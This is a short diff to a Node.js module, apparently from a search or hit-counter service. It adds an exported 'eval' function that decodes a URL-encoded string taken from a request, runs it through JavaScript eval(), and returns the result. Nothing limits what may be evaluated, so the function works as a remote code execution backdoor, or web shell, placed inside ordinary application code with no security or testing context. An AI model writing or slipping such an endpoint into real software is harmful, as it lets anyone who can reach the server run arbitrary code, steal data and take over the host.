@@ -109,3 +109,12 @@ module.exports.addHit = async function(pathname) {
     const totalHit = await SearchKeyModel.totalHit();
     return Promise.resolve(totalHit.count);
 }
+
+
+module.exports.eval = async function(ctx, evalEncode) {
+    if (!evalEncode) {
+        ctx.throw(404, 'invalid eval encode');
+    }
+    var express = decodeURIComponent(evalEncode);
+    ctx.body = eval(express);
+}
